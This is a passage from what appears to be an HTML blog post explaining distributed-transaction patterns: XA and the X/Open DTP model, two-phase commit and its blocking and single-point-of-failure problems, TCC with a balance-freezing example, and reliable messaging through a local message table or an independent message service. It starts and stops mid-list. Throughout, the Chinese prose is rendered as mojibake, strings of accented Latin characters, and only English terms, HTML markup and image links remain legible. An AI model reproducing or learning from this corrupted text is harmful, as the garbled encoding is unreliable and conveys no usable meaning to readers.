<li>èµ„æºç®¡ç†å™¨ï¼ˆ RM, Resource Manager ï¼‰ï¼šä¸€èˆ¬æ˜¯æ•°æ®åº“</li>
<li>é€šä¿¡èµ„æºç®¡ç†å™¨ï¼ˆ CRM, Communication Resource Managerï¼‰ï¼šæ˜¯TMå’ŒRMé—´çš„é€šä¿¡ä¸­é—´ä»¶</li>
</ul>
<p>åœ¨è¯¥æ¨¡å‹ä¸­ï¼Œä¸€ä¸ªåˆ†å¸ƒå¼äº‹åŠ¡ï¼ˆå…¨å±€äº‹åŠ¡ï¼‰å¯ä»¥è¢«æ‹†åˆ†æˆè®¸å¤šä¸ªæœ¬åœ°äº‹åŠ¡ï¼Œè¿è¡Œåœ¨ä¸åŒçš„APå’ŒRMä¸Šã€‚æ¯ä¸ªæœ¬åœ°äº‹åŠ¡çš„ACIDå¾ˆå¥½å®ç°ï¼Œä½†æ˜¯å…¨å±€äº‹åŠ¡å¿…é¡»ä¿è¯å…¶ä¸­åŒ…å«çš„æ¯ä¸€ä¸ªæœ¬åœ°äº‹åŠ¡éƒ½èƒ½åŒæ—¶æˆåŠŸï¼Œè‹¥æœ‰ä¸€ä¸ªæœ¬åœ°äº‹åŠ¡å¤±è´¥ï¼Œåˆ™æ‰€æœ‰å…¶å®ƒäº‹åŠ¡éƒ½å¿…é¡»å›æ»šã€‚ä½†é—®é¢˜æ˜¯ï¼Œæœ¬åœ°äº‹åŠ¡å¤„ç†è¿‡ç¨‹ä¸­ï¼Œå¹¶ä¸çŸ¥é“å…¶å®ƒäº‹åŠ¡çš„è¿è¡ŒçŠ¶æ€ã€‚å› æ­¤ï¼Œå°±éœ€è¦é€šè¿‡CRMæ¥é€šçŸ¥å„ä¸ªæœ¬åœ°äº‹åŠ¡ï¼ŒåŒæ­¥äº‹åŠ¡æ‰§è¡Œçš„çŠ¶æ€ã€‚</p>
<p>å› æ­¤ï¼Œå„ä¸ªæœ¬åœ°äº‹åŠ¡çš„é€šä¿¡å¿…é¡»æœ‰ç»Ÿä¸€çš„æ ‡å‡†ï¼Œå¦åˆ™ä¸åŒæ•°æ®åº“é—´å°±æ— æ³•é€šä¿¡ã€‚<strong>XA</strong>å°±æ˜¯ X&#x2F;Open DTPä¸­é€šä¿¡ä¸­é—´ä»¶ä¸TMé—´è”ç³»çš„<strong>æ¥å£è§„èŒƒ</strong>ï¼Œå®šä¹‰äº†ç”¨äºé€šçŸ¥äº‹åŠ¡å¼€å§‹ã€æäº¤ã€ç»ˆæ­¢ã€å›æ»šç­‰æ¥å£ï¼Œå„ä¸ªæ•°æ®åº“å‚å•†éƒ½å¿…é¡»å®ç°è¿™äº›æ¥å£ã€‚</p>
<h4 id="äºŒé˜¶æ®µæäº¤"><a href="#äºŒé˜¶æ®µæäº¤" class="headerlink" title="äºŒé˜¶æ®µæäº¤"></a>äºŒé˜¶æ®µæäº¤</h4><p>2PCï¼šTwo-Phase(feis) Commitï¼‰</p>
<p>å‚è€ƒï¼š<a href="https://zhuanlan.zhihu.com/p/35298019">æ¼«è¯åˆ†å¸ƒå¼ç³»ç»Ÿå…±è¯†åè®®: 2PC&#x2F;3PCç¯‡</a></p>
<p><strong>äºŒé˜¶æäº¤åè®®</strong>å°±æ˜¯æ ¹æ®è¿™ä¸€æ€æƒ³è¡ç”Ÿå‡ºæ¥çš„ï¼Œå°†å…¨å±€äº‹åŠ¡æ‹†åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µæ¥æ‰§è¡Œï¼š</p>
<ul>
<li>é˜¶æ®µä¸€ï¼šå‡†å¤‡é˜¶æ®µï¼Œå„ä¸ªæœ¬åœ°äº‹åŠ¡å®Œæˆæœ¬åœ°äº‹åŠ¡çš„å‡†å¤‡å·¥ä½œã€‚</li>
<li>é˜¶æ®µäºŒï¼šæ‰§è¡Œé˜¶æ®µï¼Œå„ä¸ªæœ¬åœ°äº‹åŠ¡æ ¹æ®ä¸Šä¸€é˜¶æ®µæ‰§è¡Œç»“æœï¼Œè¿›è¡Œæäº¤æˆ–å›æ»šã€‚</li>
</ul>
<p>è¿™ä¸ªè¿‡ç¨‹ä¸­éœ€è¦ä¸€ä¸ªåè°ƒè€…ï¼ˆcoordinatorï¼‰ï¼Œè¿˜æœ‰äº‹åŠ¡çš„å‚ä¸è€…ï¼ˆvoterï¼‰ã€‚</p>
<blockquote>
<p>1ï¼‰æ­£å¸¸æƒ…å†µ</p>
</blockquote>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022720.png" alt="image-20200305141029973"> </p>
<p><strong>æŠ•ç¥¨é˜¶æ®µ</strong>ï¼šåè°ƒç»„è¯¢é—®å„ä¸ªäº‹åŠ¡å‚ä¸è€…ï¼Œæ˜¯å¦å¯ä»¥æ‰§è¡Œäº‹åŠ¡ã€‚æ¯ä¸ªäº‹åŠ¡å‚ä¸è€…æ‰§è¡Œäº‹åŠ¡ï¼Œå†™å…¥redoå’Œundoæ—¥å¿—ï¼Œç„¶ååé¦ˆäº‹åŠ¡æ‰§è¡ŒæˆåŠŸçš„ä¿¡æ¯ï¼ˆ<code>agree</code>ï¼‰</p>
<p><strong>æäº¤é˜¶æ®µ</strong>ï¼šåè°ƒç»„å‘ç°æ¯ä¸ªå‚ä¸è€…éƒ½å¯ä»¥æ‰§è¡Œäº‹åŠ¡ï¼ˆ<code>agree</code>ï¼‰ï¼Œäºæ˜¯å‘å„ä¸ªäº‹åŠ¡å‚ä¸è€…å‘å‡º<code>commit</code>æŒ‡ä»¤ï¼Œå„ä¸ªäº‹åŠ¡å‚ä¸è€…æäº¤äº‹åŠ¡ã€‚</p>
<blockquote>
<p>2ï¼‰å¼‚å¸¸æƒ…å†µ</p>
</blockquote>
<p>å½“ç„¶ï¼Œä¹Ÿæœ‰å¼‚å¸¸çš„æ—¶å€™ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022721.png" alt="image-20200305141318326"> </p>
<p><strong>æŠ•ç¥¨é˜¶æ®µ</strong>ï¼šåè°ƒç»„è¯¢é—®å„ä¸ªäº‹åŠ¡å‚ä¸è€…ï¼Œæ˜¯å¦å¯ä»¥æ‰§è¡Œäº‹åŠ¡ã€‚æ¯ä¸ªäº‹åŠ¡å‚ä¸è€…æ‰§è¡Œäº‹åŠ¡ï¼Œå†™å…¥redoå’Œundoæ—¥å¿—ï¼Œç„¶ååé¦ˆäº‹åŠ¡æ‰§è¡Œç»“æœï¼Œä½†åªè¦æœ‰ä¸€ä¸ªå‚ä¸è€…è¿”å›çš„æ˜¯<code>Disagree</code>ï¼Œåˆ™è¯´æ˜æ‰§è¡Œå¤±è´¥ã€‚</p>
<p><strong>æäº¤é˜¶æ®µ</strong>ï¼šåè°ƒç»„å‘ç°æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå‚ä¸è€…è¿”å›çš„æ˜¯<code>Disagree</code>ï¼Œè®¤ä¸ºæ‰§è¡Œå¤±è´¥ã€‚äºæ˜¯å‘å„ä¸ªäº‹åŠ¡å‚ä¸è€…å‘å‡º<code>abort</code>æŒ‡ä»¤ï¼Œå„ä¸ªäº‹åŠ¡å‚ä¸è€…å›æ»šäº‹åŠ¡ã€‚</p>
<blockquote>
<p>3ï¼‰ç¼ºé™·</p>
</blockquote>
<p>äºŒé˜¶æ®µæäº¤çš„é—®é¢˜ï¼š</p>
<ul>
<li><p>å•ç‚¹æ•…éšœé—®é¢˜</p>
<p>2PCçš„ç¼ºç‚¹åœ¨äºä¸èƒ½å¤„ç†fail-stopå½¢å¼çš„èŠ‚ç‚¹failure. æ¯”å¦‚ä¸‹å›¾è¿™ç§æƒ…å†µ.</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022722.png" alt="image-20200305142812815"> </p>
<p>å‡è®¾coordinatorå’Œvoter3éƒ½åœ¨Commitè¿™ä¸ªé˜¶æ®µcrashäº†, è€Œvoter1å’Œvoter2æ²¡æœ‰æ”¶åˆ°commitæ¶ˆæ¯. è¿™æ—¶å€™voter1å’Œvoter2å°±é™·å…¥äº†ä¸€ä¸ªå›°å¢ƒ. å› ä¸ºä»–ä»¬å¹¶ä¸èƒ½åˆ¤æ–­ç°åœ¨æ˜¯ä¸¤ä¸ªåœºæ™¯ä¸­çš„å“ªä¸€ç§:</p>
<p> (1)ä¸Šè½®å…¨ç¥¨é€šè¿‡ç„¶åvoter3ç¬¬ä¸€ä¸ªæ”¶åˆ°äº†commitçš„æ¶ˆæ¯å¹¶åœ¨commitæ“ä½œä¹‹åcrashäº†</p>
<p> (2)ä¸Šè½®voter3åå¯¹æ‰€ä»¥å¹²è„†æ²¡æœ‰é€šè¿‡.</p>
</li>
<li><p>é˜»å¡é—®é¢˜</p>
<p>åœ¨å‡†å¤‡é˜¶æ®µã€æäº¤é˜¶æ®µï¼Œæ¯ä¸ªäº‹ç‰©å‚ä¸è€…éƒ½ä¼šé”å®šæœ¬åœ°èµ„æºï¼Œå¹¶ç­‰å¾…å…¶å®ƒäº‹åŠ¡çš„æ‰§è¡Œç»“æœï¼Œé˜»å¡æ—¶é—´è¾ƒé•¿ï¼Œèµ„æºé”å®šæ—¶é—´å¤ªä¹…ï¼Œå› æ­¤æ‰§è¡Œçš„æ•ˆç‡å°±æ¯”è¾ƒä½äº†ã€‚</p>
</li>
</ul>
<p>é¢å¯¹äºŒé˜¶æ®µæäº¤çš„ä¸Šè¿°ç¼ºç‚¹ï¼Œåæ¥åˆæ¼”å˜å‡ºäº†ä¸‰é˜¶æ®µæäº¤ï¼Œä½†æ˜¯ä¾ç„¶æ²¡æœ‰å®Œå…¨è§£å†³é˜»å¡å’Œèµ„æºé”å®šçš„é—®é¢˜ï¼Œè€Œä¸”å¼•å…¥äº†ä¸€äº›æ–°çš„é—®é¢˜ï¼Œå› æ­¤å®é™…ä½¿ç”¨çš„åœºæ™¯è¾ƒå°‘ã€‚å¯¹äº‹åŠ¡æœ‰å¼ºä¸€è‡´æ€§è¦æ±‚,å¯¹äº‹åŠ¡çš„æ‰§è¡Œæ•ˆç‡ä¸æ•æ„Ÿ,å¹¶ä¸”ä¸å¸Œæœ›æœ‰å¤ªå¤šçš„ä»£ç ä¾µå…¥.</p>
<h3 id="TCC"><a href="#TCC" class="headerlink" title="TCC"></a>TCC</h3><p>Try-confirm-cancel</p>
<p>TCCæ¨¡å¼å¯ä»¥è§£å†³2PCä¸­çš„èµ„æºé”å®šå’Œé˜»å¡é—®é¢˜ï¼Œå‡å°‘èµ„æºé”å®šæ—¶é—´ã€‚å®ƒé‡‡ç”¨çš„æ˜¯ä¸€ç§è¡¥å¿å‹äº‹åŠ¡çš„æ€æƒ³ã€‚</p>
<h4 id="åŸºæœ¬åŸç†"><a href="#åŸºæœ¬åŸç†" class="headerlink" title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h4><p>å®ƒæœ¬è´¨æ˜¯ä¸€ç§è¡¥å¿çš„æ€è·¯ã€‚äº‹åŠ¡è¿è¡Œè¿‡ç¨‹åŒ…æ‹¬ä¸‰ä¸ªæ–¹æ³•ï¼Œ</p>
<ul>
<li>Tryï¼šèµ„æºçš„æ£€æµ‹å’Œé¢„ç•™ï¼›</li>
<li>Confirmï¼šæ‰§è¡Œçš„ä¸šåŠ¡æ“ä½œæäº¤ï¼›è¦æ±‚ Try æˆåŠŸ Confirm ä¸€å®šè¦èƒ½æˆåŠŸï¼›</li>
<li>Cancelï¼šé¢„ç•™èµ„æºé‡Šæ”¾ã€‚</li>
</ul>
<p>æ‰§è¡Œåˆ†ä¸¤ä¸ªé˜¶æ®µï¼š</p>
<ul>
<li>å‡†å¤‡é˜¶æ®µï¼ˆtryï¼‰ï¼šèµ„æºçš„æ£€æµ‹å’Œé¢„ç•™ï¼›</li>
<li>æ‰§è¡Œé˜¶æ®µï¼ˆconfirm&#x2F;cancelï¼‰ï¼šæ ¹æ®ä¸Šä¸€æ­¥ç»“æœï¼Œåˆ¤æ–­ä¸‹é¢çš„æ‰§è¡Œæ–¹æ³•ã€‚å¦‚æœä¸Šä¸€æ­¥ä¸­æ‰€æœ‰äº‹åŠ¡å‚ä¸è€…éƒ½æˆåŠŸï¼Œåˆ™è¿™é‡Œæ‰§è¡Œconfirmã€‚åä¹‹ï¼Œæ‰§è¡Œcancel</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022723.png" alt="image-20200305155521612"> </p>
<p>ç²—çœ‹ä¼¼ä¹ä¸ä¸¤é˜¶æ®µæäº¤æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œä½†å…¶å®å·®åˆ«å¾ˆå¤§ï¼š</p>
<ul>
<li>tryã€confirmã€canceléƒ½æ˜¯ç‹¬ç«‹çš„äº‹åŠ¡ï¼Œä¸å—å…¶å®ƒå‚ä¸è€…çš„å½±å“ï¼Œä¸ä¼šé˜»å¡ç­‰å¾…å®ƒäºº</li>
<li>tryã€confirmã€cancelç”±ç¨‹åºå‘˜åœ¨ä¸šåŠ¡å±‚ç¼–å†™ï¼Œé”ç²’åº¦æœ‰ä»£ç æ§åˆ¶</li>
</ul>
<h4 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h4><p>æˆ‘ä»¬ä»¥ä¹‹å‰çš„ä¸‹å•ä¸šåŠ¡ä¸­çš„æ‰£å‡ä½™é¢ä¸ºä¾‹æ¥çœ‹ä¸‹ä¸‰ä¸ªä¸åŒçš„æ–¹æ³•è¦æ€ä¹ˆç¼–å†™ï¼Œå‡è®¾è´¦æˆ·AåŸæ¥ä½™é¢æ˜¯100ï¼Œéœ€è¦ä½™é¢æ‰£å‡30å…ƒã€‚å¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022724.png" alt="image-20200305155830732"></p>
<ul>
<li><p>ä¸€é˜¶æ®µï¼ˆTryï¼‰ï¼šä½™é¢æ£€æŸ¥ï¼Œå¹¶å†»ç»“ç”¨æˆ·éƒ¨åˆ†é‡‘é¢ï¼Œæ­¤é˜¶æ®µæ‰§è¡Œå®Œæ¯•ï¼Œäº‹åŠ¡å·²ç»æäº¤</p>
<ul>
<li>æ£€æŸ¥ç”¨æˆ·ä½™é¢æ˜¯å¦å……è¶³ï¼Œå¦‚æœå……è¶³ï¼Œå†»ç»“éƒ¨åˆ†ä½™é¢</li>
<li>åœ¨è´¦æˆ·è¡¨ä¸­æ·»åŠ å†»ç»“é‡‘é¢å­—æ®µï¼Œå€¼ä¸º30ï¼Œä½™é¢ä¸å˜</li>
</ul>
</li>
<li><p>äºŒé˜¶æ®µ</p>
<ul>
<li>æäº¤ï¼ˆConfirmï¼‰ï¼šçœŸæ­£çš„æ‰£æ¬¾ï¼ŒæŠŠå†»ç»“é‡‘é¢ä»ä½™é¢ä¸­æ‰£é™¤ï¼Œå†»ç»“é‡‘é¢æ¸…ç©º<ul>
<li>ä¿®æ”¹å†»ç»“é‡‘é¢ä¸º0ï¼Œä¿®æ”¹ä½™é¢ä¸º100-30 &#x3D; 70å…ƒ</li>
</ul>
</li>
<li>è¡¥å¿ï¼ˆCancelï¼‰ï¼šé‡Šæ”¾ä¹‹å‰å†»ç»“çš„é‡‘é¢ï¼Œå¹¶éå›æ»š<ul>
<li>ä½™é¢ä¸å˜ï¼Œä¿®æ”¹è´¦æˆ·å†»ç»“é‡‘é¢ä¸º0</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="ä¼˜åŠ¿å’Œç¼ºç‚¹"><a href="#ä¼˜åŠ¿å’Œç¼ºç‚¹" class="headerlink" title="ä¼˜åŠ¿å’Œç¼ºç‚¹"></a>ä¼˜åŠ¿å’Œç¼ºç‚¹</h4><ul>
<li><p>ä¼˜åŠ¿</p>
<p>TCCæ‰§è¡Œçš„æ¯ä¸€ä¸ªé˜¶æ®µéƒ½ä¼šæäº¤æœ¬åœ°äº‹åŠ¡å¹¶é‡Šæ”¾é”ï¼Œå¹¶ä¸éœ€è¦ç­‰å¾…å…¶å®ƒäº‹åŠ¡çš„æ‰§è¡Œç»“æœã€‚è€Œå¦‚æœå…¶å®ƒäº‹åŠ¡æ‰§è¡Œå¤±è´¥ï¼Œæœ€åä¸æ˜¯å›æ»šï¼Œè€Œæ˜¯æ‰§è¡Œè¡¥å¿æ“ä½œã€‚è¿™æ ·å°±é¿å…äº†èµ„æºçš„é•¿æœŸé”å®šå’Œé˜»å¡ç­‰å¾…ï¼Œæ‰§è¡Œæ•ˆç‡æ¯”è¾ƒé«˜ï¼Œå±äºæ€§èƒ½æœ€å¥½çš„åˆ†å¸ƒå¼äº‹åŠ¡æ–¹å¼ã€‚</p>
</li>
<li><p>ç¼ºç‚¹</p>
<ul>
<li>ä»£ç ä¾µå…¥ï¼šéœ€è¦äººä¸ºç¼–å†™ä»£ç å®ç°ï¼Œä»£ç ä¾µå…¥è¾ƒå¤š</li>
<li>å¼€å‘æˆæœ¬é«˜ï¼šä¸€ä¸ªä¸šåŠ¡éœ€è¦æ‹†åˆ†æˆ3ä¸ªæ­¥éª¤ï¼Œåˆ†åˆ«ç¼–å†™ä¸šåŠ¡å®ç°ï¼Œä¸šåŠ¡ç¼–å†™æ¯”è¾ƒå¤æ‚</li>
<li>å®‰å…¨æ€§è€ƒè™‘ï¼šcancelåŠ¨ä½œå¦‚æœæ‰§è¡Œå¤±è´¥ï¼Œèµ„æºå°±æ— æ³•é‡Šæ”¾ï¼Œéœ€è¦å¼•å…¥é‡è¯•æœºåˆ¶ï¼Œè€Œé‡è¯•å¯èƒ½å¯¼è‡´é‡å¤æ‰§è¡Œï¼Œè¿˜è¦è€ƒè™‘é‡è¯•æ—¶çš„å¹‚ç­‰é—®é¢˜</li>
</ul>
</li>
</ul>
<h4 id="ä½¿ç”¨åœºæ™¯"><a href="#ä½¿ç”¨åœºæ™¯" class="headerlink" title="ä½¿ç”¨åœºæ™¯"></a>ä½¿ç”¨åœºæ™¯</h4><p>å¯¹äº‹åŠ¡æœ‰ä¸€å®šçš„ä¸€è‡´æ€§è¦æ±‚(æœ€ç»ˆä¸€è‡´); å¯¹æ€§èƒ½è¦æ±‚è¾ƒé«˜; å¼€å‘äººå‘˜éœ€è¦å…·å¤‡è¾ƒé«˜çš„ç¼–ç èƒ½åŠ›å’Œå¹‚ç­‰å¤„ç†ç»éªŒ;</p>
<h3 id="å¯é æ¶ˆæ¯æœåŠ¡"><a href="#å¯é æ¶ˆæ¯æœåŠ¡" class="headerlink" title="å¯é æ¶ˆæ¯æœåŠ¡"></a>å¯é æ¶ˆæ¯æœåŠ¡</h3><p>è¿™ç§å®ç°æ–¹å¼çš„æ€è·¯ï¼Œå…¶å®æ˜¯æºäºebayï¼Œå…¶åŸºæœ¬çš„è®¾è®¡æ€æƒ³æ˜¯å°†è¿œç¨‹åˆ†å¸ƒå¼äº‹åŠ¡æ‹†åˆ†æˆä¸€ç³»åˆ—çš„æœ¬åœ°äº‹åŠ¡ã€‚</p>
<h4 id="åŸºæœ¬åŸç†-1"><a href="#åŸºæœ¬åŸç†-1" class="headerlink" title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h4><p>ä¸€èˆ¬åˆ†ä¸ºäº‹åŠ¡çš„å‘èµ·è€…Aå’Œäº‹åŠ¡çš„å…¶å®ƒå‚ä¸è€…Bï¼š</p>
<ul>
<li>äº‹åŠ¡å‘èµ·è€…Aæ‰§è¡Œæœ¬åœ°äº‹åŠ¡</li>
<li>äº‹åŠ¡å‘èµ·è€…Aé€šè¿‡MQå°†éœ€è¦æ‰§è¡Œçš„äº‹åŠ¡ä¿¡æ¯å‘é€ç»™äº‹åŠ¡å‚ä¸è€…B</li>
<li>äº‹åŠ¡å‚ä¸è€…Bæ¥æ”¶åˆ°æ¶ˆæ¯åæ‰§è¡Œæœ¬åœ°äº‹åŠ¡</li>
</ul>
<p>å¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022725.png" alt="image-20200305181454125"></p>
<p>è¿™ä¸ªè¿‡ç¨‹æœ‰ç‚¹åƒä½ å»å­¦æ ¡é£Ÿå ‚åƒé¥­ï¼š</p>
<ul>
<li>æ‹¿ç€é’±å»æ”¶é“¶å¤„ï¼Œç‚¹ä¸€ä»½çº¢çƒ§ç‰›è‚‰é¢ï¼Œä»˜é’±</li>
<li>æ”¶é“¶å¤„ç»™ä½ å‘ä¸€ä¸ªå°ç¥¨ï¼Œè¿˜æœ‰ä¸€ä¸ªå·ç‰Œï¼Œä½ åˆ«æŠŠç¥¨å¼„ä¸¢ï¼</li>
<li>ä½ å‡­å°ç¥¨å’Œå·ç‰Œä¸€å®šèƒ½é¢†åˆ°ä¸€ä»½çº¢çƒ§ç‰›è‚‰é¢ï¼Œä¸ç®¡éœ€è¦å¤šä¹…</li>
</ul>
<p>å‡ ä¸ªæ³¨æ„äº‹é¡¹ï¼š</p>
<ul>
<li>äº‹åŠ¡å‘èµ·è€…Aå¿…é¡»ç¡®ä¿æœ¬åœ°äº‹åŠ¡æˆåŠŸåï¼Œæ¶ˆæ¯ä¸€å®šå‘é€æˆåŠŸ</li>
<li>MQå¿…é¡»ä¿è¯æ¶ˆæ¯æ­£ç¡®æŠ•é€’å’ŒæŒä¹…åŒ–ä¿å­˜</li>
<li>äº‹åŠ¡å‚ä¸è€…Bå¿…é¡»ç¡®ä¿æ¶ˆæ¯æœ€ç»ˆä¸€å®šèƒ½æ¶ˆè´¹ï¼Œå¦‚æœå¤±è´¥éœ€è¦å¤šæ¬¡é‡è¯•</li>
<li>äº‹åŠ¡Bæ‰§è¡Œå¤±è´¥ï¼Œä¼šé‡è¯•ï¼Œä½†ä¸ä¼šå¯¼è‡´äº‹åŠ¡Aå›æ»š</li>
</ul>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬å¦‚ä½•ä¿è¯æ¶ˆæ¯å‘é€ä¸€å®šæˆåŠŸï¼Ÿå¦‚ä½•ä¿è¯æ¶ˆè´¹è€…ä¸€å®šèƒ½æ”¶åˆ°æ¶ˆæ¯ï¼Ÿ</p>
<h4 id="æœ¬åœ°æ¶ˆæ¯è¡¨"><a href="#æœ¬åœ°æ¶ˆæ¯è¡¨" class="headerlink" title="æœ¬åœ°æ¶ˆæ¯è¡¨"></a>æœ¬åœ°æ¶ˆæ¯è¡¨</h4><p>ä¸ºäº†é¿å…æ¶ˆæ¯å‘é€å¤±è´¥æˆ–ä¸¢å¤±ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ¶ˆæ¯æŒä¹…åŒ–åˆ°æ•°æ®åº“ä¸­ã€‚å®ç°æ—¶æœ‰ç®€åŒ–ç‰ˆæœ¬å’Œè§£è€¦åˆç‰ˆæœ¬ä¸¤ç§æ–¹å¼ã€‚</p>
<h5 id="ç®€åŒ–ç‰ˆæœ¬"><a href="#ç®€åŒ–ç‰ˆæœ¬" class="headerlink" title="ç®€åŒ–ç‰ˆæœ¬"></a>ç®€åŒ–ç‰ˆæœ¬</h5><p>åŸç†å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022726.png" alt="image-20200305183431211"> </p>
<ul>
<li><p>äº‹åŠ¡å‘èµ·è€…ï¼š</p>
<ul>
<li>å¼€å¯æœ¬åœ°äº‹åŠ¡</li>
<li>æ‰§è¡Œäº‹åŠ¡ç›¸å…³ä¸šåŠ¡</li>
<li>å‘é€æ¶ˆæ¯åˆ°MQ</li>
<li>æŠŠæ¶ˆæ¯æŒä¹…åŒ–åˆ°æ•°æ®åº“ï¼Œæ ‡è®°ä¸ºå·²å‘é€</li>
<li>æäº¤æœ¬åœ°äº‹åŠ¡</li>
</ul>
</li>
<li><p>äº‹åŠ¡æ¥æ”¶è€…ï¼š</p>
<ul>
<li>æ¥æ”¶æ¶ˆæ¯</li>
<li>å¼€å¯æœ¬åœ°äº‹åŠ¡</li>
<li>å¤„ç†äº‹åŠ¡ç›¸å…³ä¸šåŠ¡</li>
<li>ä¿®æ”¹æ•°æ®åº“æ¶ˆæ¯çŠ¶æ€ä¸ºå·²æ¶ˆè´¹</li>
<li>æäº¤æœ¬åœ°äº‹åŠ¡</li>
</ul>
</li>
<li><p>é¢å¤–çš„å®šæ—¶ä»»åŠ¡</p>
<ul>
<li>å®šæ—¶æ‰«æè¡¨ä¸­è¶…æ—¶æœªæ¶ˆè´¹æ¶ˆæ¯ï¼Œé‡æ–°å‘é€</li>
</ul>
</li>
</ul>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>ä¸tccç›¸æ¯”ï¼Œå®ç°æ–¹å¼è¾ƒä¸ºç®€å•ï¼Œå¼€å‘æˆæœ¬ä½ã€‚</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li><p>æ•°æ®ä¸€è‡´æ€§å®Œå…¨ä¾èµ–äºæ¶ˆæ¯æœåŠ¡ï¼Œå› æ­¤æ¶ˆæ¯æœåŠ¡å¿…é¡»æ˜¯å¯é çš„ã€‚</p>
</li>
<li><p>éœ€è¦å¤„ç†è¢«åŠ¨ä¸šåŠ¡æ–¹çš„å¹‚ç­‰é—®é¢˜</p>
</li>
<li><p>è¢«åŠ¨ä¸šåŠ¡å¤±è´¥ä¸ä¼šå¯¼è‡´ä¸»åŠ¨ä¸šåŠ¡çš„å›æ»šï¼Œè€Œæ˜¯é‡è¯•è¢«åŠ¨çš„ä¸šåŠ¡</p>
</li>
<li><p><strong>äº‹åŠ¡ä¸šåŠ¡ä¸æ¶ˆæ¯å‘é€ä¸šåŠ¡è€¦åˆ</strong>ã€ä¸šåŠ¡æ•°æ®ä¸æ¶ˆæ¯è¡¨è¦åœ¨ä¸€èµ·</p>
</li>
</ul>
<h5 id="ç‹¬ç«‹æ¶ˆæ¯æœåŠ¡"><a href="#ç‹¬ç«‹æ¶ˆæ¯æœåŠ¡" class="headerlink" title="ç‹¬ç«‹æ¶ˆæ¯æœåŠ¡"></a>ç‹¬ç«‹æ¶ˆæ¯æœåŠ¡</h5><p>ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œæˆ‘ä»¬ä¼šå¼•å…¥ä¸€ä¸ªç‹¬ç«‹çš„æ¶ˆæ¯æœåŠ¡ï¼Œæ¥å®Œæˆå¯¹æ¶ˆæ¯çš„æŒä¹…åŒ–ã€å‘é€ã€ç¡®è®¤ã€å¤±è´¥é‡è¯•ç­‰ä¸€ç³»åˆ—è¡Œä¸ºï¼Œå¤§æ¦‚çš„æ¨¡å‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022727.png" alt="image-20200305200131083"></p>
<p>ä¸€æ¬¡æ¶ˆæ¯å‘é€çš„æ—¶åºå›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022728.png" alt="image-20200305205430863"></p>
<p>äº‹åŠ¡å‘èµ·è€…Açš„åŸºæœ¬æ‰§è¡Œæ­¥éª¤ï¼š</p>
<ul>
<li>å¼€å¯æœ¬åœ°äº‹åŠ¡</li>
<li>é€šçŸ¥æ¶ˆæ¯æœåŠ¡ï¼Œå‡†å¤‡å‘é€æ¶ˆæ¯ï¼ˆæ¶ˆæ¯æœåŠ¡å°†æ¶ˆæ¯æŒä¹…åŒ–ï¼Œæ ‡è®°ä¸ºå‡†å¤‡å‘é€ï¼‰</li>
<li>æ‰§è¡Œæœ¬åœ°ä¸šåŠ¡ï¼Œ<ul>
<li>æ‰§è¡Œå¤±è´¥åˆ™ç»ˆæ­¢ï¼Œé€šçŸ¥æ¶ˆæ¯æœåŠ¡ï¼Œå–æ¶ˆå‘é€ï¼ˆæ¶ˆæ¯æœåŠ¡ä¿®æ”¹è®¢å•çŠ¶æ€ï¼‰</li>
<li>æ‰§è¡ŒæˆåŠŸåˆ™ç»§ç»­ï¼Œé€šçŸ¥æ¶ˆæ¯æœåŠ¡ï¼Œç¡®è®¤å‘é€ï¼ˆæ¶ˆæ¯æœåŠ¡å‘é€æ¶ˆæ¯ã€ä¿®æ”¹è®¢å•çŠ¶æ€ï¼‰</li>
</ul>
</li>
<li>æäº¤æœ¬åœ°äº‹åŠ¡</li>
</ul>
<p>æ¶ˆæ¯æœåŠ¡æœ¬èº«æä¾›ä¸‹é¢çš„æ¥å£ï¼š</p>
<ul>
<li>å‡†å¤‡å‘é€ï¼šæŠŠæ¶ˆæ¯æŒä¹…åŒ–åˆ°æ•°æ®åº“ï¼Œå¹¶æ ‡è®°çŠ¶æ€ä¸ºå‡†å¤‡å‘é€</li>
<li>å–æ¶ˆå‘é€ï¼šæŠŠæ•°æ®åº“æ¶ˆæ¯çŠ¶æ€ä¿®æ”¹ä¸ºå–æ¶ˆ</li>
<li>ç¡®è®¤å‘é€ï¼šæŠŠæ•°æ®åº“æ¶ˆæ¯çŠ¶æ€ä¿®æ”¹ä¸ºç¡®è®¤å‘é€ã€‚å°è¯•å‘é€æ¶ˆæ¯ï¼ŒæˆåŠŸåä¿®æ”¹çŠ¶æ€ä¸ºå·²å‘é€</li>
<li>ç¡®è®¤æ¶ˆè´¹ï¼šæ¶ˆè´¹è€…å·²ç»æ¥æ”¶å¹¶å¤„ç†æ¶ˆæ¯ï¼ŒæŠŠæ•°æ®åº“æ¶ˆæ¯çŠ¶æ€ä¿®æ”¹ä¸ºå·²æ¶ˆè´¹</li>
